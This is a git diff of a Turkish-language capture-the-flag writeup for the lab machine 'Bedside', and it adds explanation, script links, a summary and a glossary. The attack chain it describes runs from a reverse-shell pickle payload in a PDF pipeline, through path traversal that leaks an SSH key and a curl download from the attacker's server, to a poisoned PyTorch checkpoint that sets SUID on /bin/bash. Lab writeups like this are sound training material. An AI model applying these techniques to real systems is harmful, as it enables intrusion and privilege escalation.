@@ -103,6 +103,7 @@ gobuster dir -u http://research.bedside.htb -w /usr/share/seclists/Discovery/Web
 
 ![bedside ana sayfa](images/07.png)
 
+Ana sayfa klasik bir klinik tanıtım sitesi, doğrudan kullanılabilir bir fonksiyon barındırmıyor.
 
 ### 8 — Research Portal'ı İnceleme
 
@@ -114,7 +115,7 @@ Kabul ettiği formatlar: `jpeg, jpg, png, bmp, tiff, dcm, pdf`.
 
 ---
 
-## Foothold — Dosya Yükleme ve Reverse Shell
+## Foothold — PDF Pipeline Üzerinden Pickle Deserialization
 
 ### 9 — Payload Hazırlama ve Yükleme
 
@@ -122,6 +123,7 @@ Kabul ettiği formatlar: `jpeg, jpg, png, bmp, tiff, dcm, pdf`.
 
 `bedsidee.py` scriptiyle bir reverse shell komutu barındıran kötücül bir pickle payload'ı oluşturuyoruz (`shell.pickle.gz`). Ardından `trigger.py` scriptiyle bu payload'ı araştırma portalına yüklüyoruz — `sh.pickle.gz` ve `trigger.pdf` olarak yükleniyor ve arka planda çalışan **cron/watcher** sürecinin bunu işlemesini (`~30s` içinde) bekliyoruz.
 
+Script'ler: [`bedsidee.py`](scripts/bedsidee.py) · [`trigger.py`](scripts/trigger.py)
 
 ### 10 — Reverse Shell 
 
@@ -148,7 +150,8 @@ ardından `Ctrl+Z` ile arka plana alıp `stty raw -echo; fg` ile terminali tam e
 cat requirements.txt
 ```
 
-`pdfminer.six==20250506` paketi görülüyor — watcher, PDF dosyalarını `pdfminer` ile parse ediyor. Kök dizine çıkıp (`cd ..`, `ls -la`) genel yapıyı inceliyoruz.
+`pdfminer.six==20250506` paketi görülüyor — watcher, PDF dosyalarını `pdfminer` ile parse ediyor. Kök dizine çıkıp (`cd ..`, `ls -la`) genel yapıyı inceliyoruz: `.dockerenv` dosyası **container içinde** olduğumuzu doğruluyor, `/datastore` dizininin `dataops` grubuna yazma izni verdiğini görüyoruz (`drwxrwx--- dataops`).
+Container içinde olduğumuzu bildiğimize göre, Docker'ın varsayılan bridge network gateway'i olan **`172.17.0.1`**'i deneyip, nmap'te dışarıdan filtrelenmiş görünen **3000 portuna** container içinden erişilip erişilemediğine bakıyoruz.
 `sudo -l` denemesi bu noktada sonuç vermiyor.
 
 
@@ -233,7 +236,15 @@ cat user.txt
 
 ## Privilege Escalation — ML Checkpoint Deserialization
 
-### 18 — Kötücül Checkpoint Payload Hazırlama
+### 18 — Sudo -l Yetkisi ve Kötücül Checkpoint Payload Hazırlama
+
+```bash
+sudo -l
+```
+
+![sudo -l](images/18-1.png)
+
+`developer` kullanıcısının sudo yetkilerine bakıyoruz. Çıktı kritik: **`(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py`** — yani `developer`, bu scripti şifresiz ve **root olarak** çalıştırabiliyor.
 
 ```bash
 nano bedside_evil.py
@@ -246,6 +257,8 @@ python3 -m http.server 8080
 
 
 PyTorch'un `.pt` formatı, pickle edilmiş veri içeren bir zip arşivi. `bedside_evil.py`, içine `os.system()` çağıran bir `__reduce__` nesnesi gömülü sahte bir checkpoint üretiyor — `torch.load()` ile açıldığında `chmod +s /bin/bash` komutu çalışacak. Gözden kaçırmak için masum bir `dummy.png` de hazırlanıp, ikisi `http.server` ile servis ediliyor.
+
+Script: [`bedside_evil.py`](scripts/bedside_evil.py)
 
 
 ### 19 — Payload'ı datastore Dizinine İndirme
@@ -261,7 +274,7 @@ curl -s -o /datastore/processed/dummy.png http://10.10.15.231:8080/dummy.png
 `datawrangler` kullanıcısının `dataops` grup üyeliği sayesinde `/datastore/checkpoints` ve `/datastore/processed` dizinlerine yazma izni olduğunu görüyoruz. Kendi HTTP sunucumuzdan kötücül checkpoint dosyasını ve sahte görüntüyü doğrudan bu dizinlere indiriyoruz.
 
 
-### 20 — Teslimatı Doğrulama
+### 20 — Payload'ın Hedefe Ulaştığını Doğrulama
 
 ![http server log](images/20.png)
 
@@ -295,9 +308,57 @@ cat /root/root.txt
 
 ![root.txt](images/22.png)
 
-Root flag'i okunuyor — makine tamamlandı.
+Makine tamamlandı.
 
 
+## ---  ÖZET  ---
+
+Bu saldırı zincirinde, önce virtual host fuzzing ile `research.bedside.htb` subdomainini keşfettik. Buradaki dosya yükleme portalının arka planda bir PDF işleme pipeline'ı (`pdf_watcher.py`, `pdfminer.six` tabanlı) çalıştırdığını tespit edip, hazırladığımız kötücül bir pickle payload'ını PDF içine gömerek `datawrangler` kullanıcısı bağlamında bir reverse shell elde ettik.
+
+Container içinde olduğumuzu `.dockerenv` dosyasından doğruladıktan sonra, nmap'te dışarıdan filtrelenmiş görünen 3000 portuna Docker'ın varsayılan gateway IP'si (`172.17.0.1`) üzerinden container içinden erişebildiğimizi fark ettik. Bu iç servisteki bir path traversal zafiyetini (`--path-as-is` ile) kullanarak önce `/etc/passwd`'i, ardından `developer` kullanıcısının SSH private key'ini sızdırdık ve bu kimlik bilgisiyle ana host'a yatay hareket ederek user flag'ini aldık.
+
+`developer` kullanıcısının `sudo -l` çıktısında, `bedside_trainer.py` scriptini root olarak çalıştırabildiğini gördük. Bu script, MONAI/Ignite framework'ü üzerinden `/datastore/checkpoints` dizinindeki `.pt` checkpoint dosyalarını otomatik yüklüyordu — ve bu dizine `dataops` grup üyeliğimiz sayesinde yazabiliyorduk. İçine `os.system()` çağıran bir `__reduce__` nesnesi gömülü sahte bir PyTorch checkpoint dosyası hazırlayıp bu dizine bıraktık; script'i tetiklediğimizde `torch.load()` üzerinden pickle deserialize edildi ve komutumuz root bağlamında çalışarak `/bin/bash`'e SUID bit kazandırdı. Son olarak `/bin/bash -p` ile root shell alıp root flag'ini elde ettik.
+
+
+## ---  TERİMLER SÖZLÜĞÜ  ---
+
+**Pipeline:** Bir verinin (dosya/görüntü vb.) art arda birden fazla işleme adımından otomatik olarak geçirildiği süreç zinciri.
+
+**Watcher:** Belirli bir dizini/kaynağı sürekli izleyip, yeni bir dosya/olay geldiğinde otomatik olarak tetiklenen arka plan süreci.
+
+**Pickle Payload:** Python'ın `pickle` serileştirme formatıyla hazırlanmış, deserialize edildiğinde saldırganın istediği kodu çalıştıran kötücül veri.
+
+**Cron/Watcher:** Belirli aralıklarla (burada ~30 saniyede bir) otomatik tetiklenen, yeni dosyaları işleyen zamanlanmış arka plan süreci.
+
+**Parse:** Bir dosyanın/verinin/PDF'in içeriğinin program tarafından okunup yorumlanması, anlamlı parçalara ayrıştırılması.
+
+**ML Pipeline Abuse:** Bir makine öğrenmesi iş akışının (veri/model yükleme, eğitim, checkpoint işleme gibi) güvenlik açıklarının saldırı amacıyla kötüye kullanılması.
+
+**SSRF (Server-Side Request Forgery):** Bir sunucunun, saldırgan tarafından kontrol edilen bir isteği kendi adına (genelde iç ağa) göndermeye zorlanması.
+
+**Yatay Hareket (Lateral Movement):** Ele geçirilen bir kullanıcı/sistem üzerinden, aynı ağdaki başka bir kullanıcıya veya sisteme geçme tekniği.
+
+**Torch Deserialization:** PyTorch'un `.pt`/`.pth` checkpoint dosyalarını yüklerken, içindeki pickle verisini nesneye geri dönüştürme (deserialize etme) işlemi.
+
+**Path Traversal:** `../` gibi dizilerle, bir uygulamanın erişime kapatması gereken dosya sistemi konumlarına (örn. `/etc/passwd`) erişilmesini sağlayan zafiyet türü.
+
+**Credential:** Bir sisteme kimlik doğrulamak için kullanılan bilgi (parola, SSH private key, token vb.).
+
+**Deserialize:** Serileştirilmiş (diske/ağa yazılmış) verinin, programın kullanabileceği bir nesne haline geri dönüştürülmesi işlemi.
+
+**SUID Bit:** Bir çalıştırılabilir dosyaya atandığında, dosyanın sahibinin (örn. root) yetkisiyle çalışmasını sağlayan özel izin biti (`chmod +s`).
+
+**CMap (Character Map):** PDF'lerde font karakterlerinin kodlanma biçimini tanımlayan yapı; pdfminer bu yapıyı çözümlerken diskten pickle veri okuyabiliyor.
+
+**torch.load():** PyTorch'ta `.pt` dosyalarını yükleyen fonksiyon; varsayılan ayarlarında pickle deserialize eder.
+
+**MONAI:** Tıbbi görüntüleme verileri (X-ray, CT, MR vb.) üzerinde çalışmak için geliştirilmiş, PyTorch tabanlı açık kaynak derin öğrenme framework'ü.
+
+**NOPASSWD:** sudoers yapılandırmasında, belirtilen komutun şifre sorulmadan çalıştırılabileceğini belirten direktif.
+
+**Insecure Deserialization:** Güvenilmeyen, dışarıdan kontrol edilebilen verinin bir programlama dilinin nesne formatına (pickle, serialize, vb.) geri dönüştürülmesi sırasında keyfi kod çalıştırılabilmesine izin veren zafiyet sınıfı.
+
+**Docker Bridge Network:** Container'ların varsayılan olarak bağlandığı, host ile container'lar arasında izole bir sanal ağ. Genelde gateway IP'si `172.17.0.1` olur.
 
 
 
